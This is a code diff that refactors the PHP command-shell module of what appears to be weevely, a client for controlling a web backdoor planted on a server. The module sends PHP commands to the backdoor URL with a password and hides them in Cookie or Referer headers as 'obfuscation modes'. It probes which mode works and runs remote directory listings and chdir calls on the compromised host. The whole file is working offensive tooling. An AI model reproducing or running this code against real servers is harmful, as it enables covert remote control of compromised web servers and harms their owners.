@@ -4,187 +4,171 @@ Created on 22/ago/2011
 @author: norby
 '''
 
-from core.module import Module, ModuleException
+from core.moduleprobe import ModuleProbe
+from core.moduleexception import ModuleException, ProbeException, ProbeSucceed, InitException
 from core.http.cmdrequest import CmdRequest, NoDataException
-from core.parameters import ParametersList, Parameter as P
+from core.savedargparse import SavedArgumentParser as ArgumentParser
+from argparse import SUPPRESS
+from ast import literal_eval
 
-import random, os
+import random, os, shlex, types
 
-classname = 'Php'
+class Php(ModuleProbe):
+    '''Shell to execute PHP commands'''
 
+    mode_choices = ['Cookie', 'Referer' ]
 
-class Php(Module):
-    '''Shell to execute PHP commands
+    argparser = ArgumentParser(usage=__doc__)
+    argparser.add_argument('cmd', help='PHP command enclosed with brackets and terminated by semi-comma', nargs='+' )
+    argparser.add_argument('-mode', help='Obfuscation mode', choices = mode_choices)
+    argparser.add_argument('-proxy', help='HTTP proxy')
+    argparser.add_argument('-precmd', help='Insert string at beginning of commands', nargs='+'  )
+    argparser.add_argument('-debug', help='Change debug class (3 or less to show request and response)', type=int, default=4, choices =range(1,5))
+    argparser.add_argument('-post', help=SUPPRESS, type=literal_eval, default={})
 
-    Every run should be run_module to avoid recursive
-    interpreter probing
-    '''
+    def _init_module(self):
+        self.stored_args = { 'mode' : None, 'path' : '' }
 
-    params = ParametersList('PHP command shell', [],
-                             P(arg='cmd', help='PHP command enclosed with brackets and terminated by semi-comma', required=True, pos=0),
-                             P(arg='mode', help='Obfuscation mode', choices = ['Cookie', 'Referer' ]),
-                             P(arg='proxy', help='HTTP proxy'),
-                             P(arg='precmd', help='Insert string at beginning of commands'),
-                             P(arg='debug', help='Enable requests and response debug', type=bool, default=False, hidden=True)
-                        )
-
-
-    def __init__(self, modhandler, url, password):
-
-        self.cwd_vector = None
-        self.path = None
-        self.proxy = None
-
-        self.modhandler = modhandler
-
-        self.post_data = {}
-
-        self.current_mode = None
-
-        self.use_current_path = True
-
-        self.available_modes = self.params.get_parameter_choices('mode')
-
-        mode = self.params.get_parameter_value('mode')
-        if mode:
-            self.modes = [ mode ]
+    def _check_args(self, args):
+        
+        ModuleProbe._check_args(self,args)
+        
+        # Set proxy 
+        if self.args['proxy']:
+            self.mprint('[!] Proxies can break weevely requests, use proxychains')
+            self.args['proxy'] = { 'http' : self.args['proxy'] }
         else:
-            self.modes = self.available_modes
+            self.args['proxy'] = {}        
+        
 
-        proxy = self.params.get_parameter_value('proxy')
+    def _prepare_probe(self):
+        
+        # Slacky backdoor validation. 
+        # Avoid probing (and storing) if mode is specified by user
+        
+        if not self.args['mode']:
+            if not self.stored_args['mode']:
+                self.__slacky_probe()
+                
+            self.args['mode'] = self.stored_args['mode']
+        
+        
+        
 
-        if proxy:
-            self.mprint('[!] Proxies can break weevely requests, if possibile use proxychains')
-            self.proxy = { 'http' : proxy }
-
-
-        Module.__init__(self, modhandler, url, password)
-
+        # Check if is raw command is not 'ls' 
+        if self.args['cmd'][0][:2] != 'ls':
+                
+            # Warn about not ending semicolon
+            if self.args['cmd'] and self.args['cmd'][-1][-1] not in (';', '}'):
+                self.mprint('PHP command \'..%s\' does not have trailing semicolon' % (self.args['cmd'][-1]))
+          
+            # Prepend chdir
+            if self.stored_args['path']:
+                self.args['cmd'] = [ 'chdir(\'%s\');' % (self.stored_args['path']) ] + self.args['cmd'] 
+                
+            # Prepend precmd
+            if self.args['precmd']:
+                self.args['cmd'] = self.args['precmd'] + self.args['cmd']
 
 
     def _probe(self):
-
-        for currentmode in self.modes:
-
-            rand = str(random.randint( 11111, 99999 ))
-
-            if self.run_module('echo %s;' % (rand)) == rand:
-                self.current_mode = currentmode
-                self.params.set_and_check_parameters({'mode' : currentmode}, False)
-                break
-
-        if not self.current_mode:
-            raise ModuleException(self.name,  "PHP interpreter initialization failed")
+        
+        
+        # If 'ls', execute __ls_handler
+        if self.args['cmd'][0][:2] == 'ls':
+            self._output = self.__ls_handler(self.args['cmd'][0])
         else:
-
-            if self.run_module('is_callable("is_dir") && is_callable("chdir") && is_callable("getcwd") && print(1);') != '1':
-                self.mprint('[!] Error testing directory change methods, \'cd\' and \'ls\' will not work.')
-            else:
-                self.cwd_vector = "chdir('%s'); %s"
+            self._output = self.__do_request(self.args['cmd'], self.args['mode'])
+        
 
 
-    def set_post_data(self, post_data = {}):
-        """Post data is cleaned after every use """
+    def __do_request(self, listcmd, mode):
+        
+        cmd = listcmd
+        if isinstance(listcmd, types.ListType):
+            cmd = ' '.join(listcmd)
+        
 
-        self.post_data.update(post_data)
+        request = CmdRequest( self.modhandler.url, self.modhandler.password, self.args['proxy'])
+        request.setPayload(cmd, mode)
 
+        msg_class = self.args['debug']
 
-    def run_module(self, cmd, mode = None, proxy = None, precmd= None, debug = None):
+        if self.args['post']:
+            request.setPostData(self.args['post'])
+            self.mprint( "Post data values:", msg_class)
+            for field in self.args['post']:
+                self.mprint("  %s (%i)" % (field, len(self.args['post'][field])), msg_class)
 
-        if mode:
-            self.mode = mode
-
-        if proxy:
-            if not self.proxy:
-                self.mprint('[!] Proxies can break weevely requests, if possibile use proxychains')
-            self.proxy = { 'http' : proxy }
-
-        # Debug and precmd are to force also if called with None like other modules do
-        if debug == None:
-            debug = self.params.get_parameter_value('debug')
-        if precmd == None:
-            precmd = self.params.get_parameter_value('precmd')
-
-        if self.use_current_path and self.cwd_vector and self.path:
-            cmd = self.cwd_vector % (self.path, cmd)
-
-        if precmd:
-            cmd = precmd + ' ' + cmd
-
-        cmd = cmd.strip()
-        if cmd and cmd[-1] not in (';', '}'):
-            self.mprint('[!] Warning: PHP command \'..%s\' doesn\'t have trailing semicolon' % (cmd[-10:]))
-
-        request = CmdRequest( self.url, self.password, self.proxy)
-        request.setPayload(cmd, self.current_mode)
-
-
-        debug_level = 1
-        if debug:
-            debug_level = 5
-
-        if self.post_data:
-            request.setPostData(self.post_data)
-            self.mprint( "Post data values:", debug_level)
-            for p in self.post_data:
-                self.mprint("  %s (%i)" % (p, len(self.post_data[p])), debug_level)
-            self.post_data = {}
-
-
-        self.mprint( "Request: %s" % (cmd), debug_level)
+        self.mprint( "Request: %s" % (cmd), msg_class)
 
 
         try:
-            resp = request.execute()
+            response = request.execute()
         except NoDataException, e:
-            self.mprint( "Response: NoData", debug_level)
-            pass
+            raise ProbeException(self.name, e.strerror)
         except IOError, e:
-            self.mprint('[!] %s. Are backdoor URL or proxy reachable?' % e.strerror)
+            raise ProbeException(self.name, '%s. Are backdoor URL or proxy reachable?' % e.strerror)
         except Exception, e:
-            self.mprint('[!] Error connecting to backdoor URL or proxy')
-        else:
+            raise ProbeException(self.name, '%s. Error connecting to backdoor URL or proxy' % e.strerror)
+    
+        if 'error' in response and 'eval()\'d code' in response:
+            raise ProbeException(self.name, 'Invalid response \'%s\', skipping' % (cmd))
+        
+        self.mprint( "Response: %s" % response, msg_class)
+        
+        return response
 
-            if  'error' in resp and 'eval()\'d code' in resp:
-                self.mprint('[!] Invalid response \'%s\', skipping' % (cmd), debug_level)
-            else:
-                self.mprint( "Response: %s" % resp, debug_level)
-                return resp
+    def __slacky_probe(self):
+        
+        for currentmode in self.mode_choices:
 
+            rand = str(random.randint( 11111, 99999 ))
 
-    def cwd_handler (self, path):
+            try:
+                response = self.__do_request('print(%s);' % (rand), currentmode)
+            except Exception, e:
+                raise InitException(self.name, 'PHP interpreter loading failed: %s' % e)
+            
+            if response == rand:
+                
+                self.stored_args['mode'] = currentmode
+                
+                # Set as best interpreter
+                self.modhandler.interpreter = self.name
+                
+                
+                return
+        
+        
+        raise InitException(self.name, 'PHP interpreter loading failed')
+        
 
-        response = self.run_module( "@chdir('%s'); print(getcwd());" % path)
-        if response.rstrip('/') == path.rstrip('/'):
-            if path != '/':
-                self.path = path.rstrip('/')
-            else:
-                self.path = path
-
-            return self.path
-
-    def ls_handler (self, cmd):
-
-        cmd_splitted = cmd.split()
-
-        ls_vector = "$dir=@opendir('%s'); $a=array(); while(($f = readdir($dir))) { $a[]=$f; }; sort($a); print(join('\n', $a));"
+    def __ls_handler (self, cmd):
 
         path = None
+        cmd_splitted = cmd.split(' ')
+        
         if len(cmd_splitted)>2:
-            self.mprint('[!] Error, PHP shell \'ls\' replacement support only path as argument')
+            raise ProbeException(self.name,'Error, PHP shell \'ls\' replacement supports only one <path> argument')
+        elif len(cmd_splitted)==2 and self.stored_args['path']:
+            # Should join with remote os.sep, but this should work (PHP support '\' as '/')
+            path = os.path.join(self.stored_args['path'], cmd_splitted[1])
         elif len(cmd_splitted)==2:
+            # Is that fallback useful?
             path = cmd_splitted[1]
-        elif self.path:
-            path = self.path
+        elif self.stored_args['path']:
+            path = self.stored_args['path']
         else:
             path = '.'
 
         if path:
-            response = self.run_module( ls_vector % (path) )
-
-            if not response:
-                self.mprint('[!] Error listing files in \'%s\'. Wrong path or not enough privileges' % path)
-            else:
+            response = self.__do_request("$path=\"%s\"; $d=@opendir($path); $a=array(); while(($f = readdir($d))) { $a[]=$f; }; sort($a); print(join('\n', $a));" % path, self.stored_args['mode'])
+            
+            if response:
                 return response
+        
+        raise ProbeException('', "List directory '%s' contents failed, no such file or directory or permission denied'" % path)
+            
 
 
